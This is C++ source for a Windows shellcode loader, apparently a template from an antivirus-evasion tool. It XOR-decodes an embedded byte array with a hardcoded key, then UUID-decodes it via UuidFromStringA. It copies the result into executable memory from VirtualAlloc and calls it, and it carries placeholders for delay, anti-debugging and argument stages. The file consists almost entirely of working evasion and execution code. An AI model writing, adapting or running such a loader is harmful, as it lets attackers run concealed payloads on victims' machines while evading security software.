#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <rpc.h>


//####DEFINE####

int xor_encode_8637309acc394287b8019e15b19ab782(unsigned char* data, int data_len)
{
    const char* key = "x-HO0.fTipKi";
    int key_len = 12;
    
    printf("\n[*] Before XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    for (int i = 0; i < data_len; i++){
        data[i] = (data[i] ^ (unsigned char)key[i % key_len]);
    }


    printf("\n[*] After XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    return data_len;
}
int uuid_decode_9328bb239cd74a978738febf037943cd(unsigned char* encoded, int length)
{

    size_t uuid_length = 36;
    size_t uuid_count = ((length + uuid_length - 1) / uuid_length) - 1; // Calcul du nombre de uuids

    printf("\n[*] Before UUID values: {");
    for (DWORD i = 0; i < length; i++) {
        printf("0x%02x", encoded[i]);
        if (i < length - 1) {
            printf(",");
        }
    }
    printf("}\n");
    // Allouer de la mémoire pour le tableau de uuids
    char** uuids = (char**)malloc(uuid_count * sizeof(char*));
    if (uuids == NULL) {
        perror("Failed to allocate memory");
        exit(EXIT_FAILURE);
    }

    // Découper la chaîne en uuids
    for (size_t i = 0; i < uuid_count; ++i) {
        // Allouer de la mémoire pour chaque segment (uuid_length + 1 pour le caractère NULL)
        uuids[i] = (char*)malloc(uuid_length + 1);
        if (uuids[i] == NULL) {
            perror("Failed to allocate memory");
            exit(EXIT_FAILURE);
        }

        // Copier la partie de la chaîne dans le segment
        size_t start_index = i * uuid_length;
        size_t length_to_copy = (length - start_index < uuid_length) ? (length - start_index) : uuid_length;
        strncpy(uuids[i], (const char*)(encoded + start_index), length_to_copy);
        uuids[i][length_to_copy] = '\0'; // Ajouter le caractère NULL de fin

    }

    // Allocate memory for the binary UUIDs
    unsigned char* binary_uuids = (unsigned char*)malloc(uuid_count * sizeof(UUID));
    if (binary_uuids == NULL) {
        perror("Failed to allocate memory");
        exit(EXIT_FAILURE);
    }

    // Convert the UUID strings to binary format and store them in the binary_uuids buffer
    for (size_t i = 0; i < uuid_count; ++i) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)(binary_uuids + i * sizeof(UUID)));
        if (status != RPC_S_OK) {
            printf("UuidFromStringA n°%d failed with status %d\n", i,status);
            free(binary_uuids);
            for (size_t j = 0; j < uuid_count; ++j) {
                free(uuids[j]);
            }
            free(uuids);
            exit(EXIT_FAILURE);
        }
    }
    // Copy the binary UUID data back to the encoded buffer
    memcpy(encoded, binary_uuids, uuid_count * sizeof(UUID));

    // Print the hex dump of the encoded buffer
    printf("\n[*] After UUID values: {");
    for (DWORD i = 0; i < length; i++) {
        printf("0x%02x", encoded[i]);
        if (i < length - 1) {
            printf(",");
        }
    }
    printf("}\n");

    // Free the UUID string segments
    for (size_t i = 0; i < uuid_count; ++i) {
        free(uuids[i]);
    }
    free(uuids); // Free the array of UUID strings

    // Free the binary UUIDs buffer
    free(binary_uuids);

    return uuid_count * sizeof(UUID); // Return the number of UUIDs as char (adjust the return type as needed)
}



DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = {0x1d,0x19,0x70,0x7c,0x04,0x16,0x00,0x37,0x44,0x15,0x73,0x0f,0x48,0x00,0x78,0x7f,0x53,0x1e,0x4b,0x64,0x59,0x40,0x7b,0x44,0x4c,0x1c,0x7d,0x7e,0x04,0x1f,0x53,0x64,0x5c,0x42,0x7e,0x58,0x1c,0x1f,0x7b,0x7e,0x04,0x16,0x53,0x62,0x44,0x44,0x73,0x5f,0x4d,0x00,0x7d,0x7d,0x08,0x4c,0x4b,0x62,0x59,0x44,0x73,0x44,0x40,0x4f,0x7d,0x7d,0x01,0x16,0x52,0x6c,0x51,0x12,0x7e,0x5b,0x4f,0x1f,0x70,0x2d,0x04,0x16,0x54,0x64,0x44,0x44,0x73,0x5c,0x48,0x00,0x2a,0x78,0x00,0x48,0x4b,0x60,0x08,0x44,0x2a,0x44,0x4c,0x49,0x7b,0x7e,0x53,0x17,0x52,0x6c,0x5a,0x41,0x28,0x59,0x4f,0x4e,0x7e,0x7e,0x03,0x4d,0x07,0x37,0x44,0x42,0x28,0x59,0x4a,0x00,0x7c,0x7e,0x02,0x1e,0x4b,0x37,0x58,0x13,0x72,0x44,0x48,0x49,0x7c,0x7e,0x00,0x1f,0x05,0x65,0x0c,0x42,0x2e,0x0d,0x4c,0x15,0x7d,0x7e,0x04,0x1f,0x53,0x66,0x44,0x45,0x79,0x51,0x1a,0x00,0x70,0x2d,0x02,0x1e,0x4b,0x60,0x5b,0x43,0x28,0x44,0x4c,0x15,0x78,0x7e,0x54,0x1e,0x5e,0x36,0x51,0x40,0x73,0x51,0x4c,0x15,0x78,0x7f,0x00,0x1e,0x56,0x64,0x44,0x13,0x7b,0x51,0x4d,0x00,0x7e,0x78,0x07,0x1a,0x4b,0x60,0x51,0x40,0x7a,0x44,0x1c,0x1d,0x7d,0x7f,0x08,0x4c,0x52,0x6c,0x58,0x48,0x7f,0x5d,0x4c,0x14,0x7a,0x7f,0x04,0x1e,0x5e,0x36,0x44,0x14,0x7b,0x59,0x49,0x00,0x7d,0x79,0x55,0x1d,0x4b,0x60,0x51,0x16,0x2d,0x44,0x1b,0x14,0x7c,0x7e,0x08,0x4c,0x55,0x60,0x51,0x48,0x7f,0x51,0x4b,0x1c,0x7c,0x2b,0x54,0x18,0x56,0x65,0x44,0x44,0x73,0x0a,0x41,0x00,0x2b,0x7f,0x03,0x1f,0x4b,0x35,0x0a,0x44,0x7a,0x44,0x1b,0x1c,0x2b,0x76,0x00,0x4a,0x52,0x65,0x59,0x41,0x28,0x58,0x1e,0x1c,0x7f,0x7a,0x55,0x1e,0x55,0x6c,0x44,0x40,0x78,0x5d,0x1b,0x00,0x7a,0x7b,0x04,0x4d,0x4b,0x64,0x51,0x44,0x7e,0x44,0x4b,0x14,0x2c,0x7e,0x07,0x1b,0x02,0x6c,0x5c,0x48,0x7f,0x5d,0x4c,0x14,0x7a,0x7b,0x04,0x1e,0x5e,0x36,0x44,0x14,0x7b,0x59,0x49,0x00,0x7c,0x7e,0x06,0x18,0x4b,0x6c,0x0b,0x40,0x28,0x44,0x4c,0x15,0x7c,0x7b,0x08,0x4c,0x52,0x64,0x58,0x13,0x7f,0x50,0x40,0x4f,0x7c,0x7e,0x54,0x1e,0x56,0x65,0x44,0x48,0x73,0x59,0x4c,0x00,0x78,0x7e,0x04,0x16,0x4b,0x30,0x59,0x44,0x7a,0x44,0x4d,0x15,0x7c,0x7e,0x05,0x16,0x53,0x31,0x5c,0x49,0x7e,0x08,0x4d,0x14,0x7c,0x7e,0x05,0x16,0x52,0x65,0x44,0x45,0x2a,0x5d,0x49,0x00,0x70,0x7c,0x04,0x16,0x4b,0x31,0x0a,0x42,0x7b,0x44,0x4c,0x1c,0x7d,0x7d,0x56,0x48,0x03,0x64,0x5c,0x48,0x7f,0x58,0x40,0x4f,0x7c,0x77,0x05,0x4f,0x53,0x6d,0x44,0x15,0x72,0x58,0x4a,0x00,0x2e,0x29,0x05,0x19,0x4b,0x32,0x0f,0x16,0x2d,0x44,0x4d,0x49,0x7c,0x77,0x52,0x4f,0x56,0x65,0x59,0x40,0x7b,0x59,0x48,0x1d,0x78,0x7f,0x00,0x1e,0x56,0x64,0x44,0x44,0x73,0x59,0x48,0x00,0x70,0x2b,0x08,0x4a,0x4b,0x64,0x58,0x40,0x7a,0x44,0x48,0x1d,0x78,0x7f,0x04,0x1f,0x04,0x35,0x5a,0x41,0x73,0x0b,0x1c,0x18,0x2e,0x29,0x08,0x19,0x50,0x32,0x44,0x16,0x7b,0x0b,0x1a,0x00,0x29,0x7d,0x52,0x1b,0x4b,0x61,0x5f,0x44,0x7a,0x44,0x1a,0x4c,0x29,0x79,0x09,0x1b,0x04,0x30,0x50,0x14,0x2d,0x0f,0x1b,0x19,0x70,0x7c,0x04,0x16,0x02,0x61,0x44,0x43,0x28,0x5b,0x40,0x00,0x7f,0x2c,0x00,0x18,0x4b,0x64,0x08,0x48,0x7b,0x44,0x1e,0x4f,0x2d,0x7f,0x07,0x1b,0x56,0x61,0x0b,0x12,0x7f,0x5e,0x4e,0x4c,0x7e,0x29,0x07,0x1c,0x57,0x67,0x44,0x45,0x72,0x59,0x48,0x00,0x70,0x76,0x04,0x1f,0x4b,0x30,0x08,0x16,0x2d,0x44,0x1c,0x18,0x7e,0x7c,0x06,0x1f,0x50,0x37,0x5f,0x43,0x79,0x0c,0x48,0x1d,0x7e,0x7a,0x07,0x16,0x50,0x61,0x44,0x49,0x7b,0x50,0x48,0x00,0x71,0x7f,0x09,0x1e,0x4b,0x6d,0x59,0x49,0x7b,0x44,0x41,0x1d,0x71,0x7f,0x09,0x1e,0x5f,0x64,0x50,0x40,0x72,0x59};
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    length = xor_encode_8637309acc394287b8019e15b19ab782(encoded, length);length = uuid_decode_9328bb239cd74a978738febf037943cd(encoded, length);

    unsigned char* decoded = encoded;

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    void *exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
        return -1;

    bool success = false;
    success = memcpy(exec, decoded, length);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    ((void (*)())exec)();
    
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####

    esc_main(NULL);
}
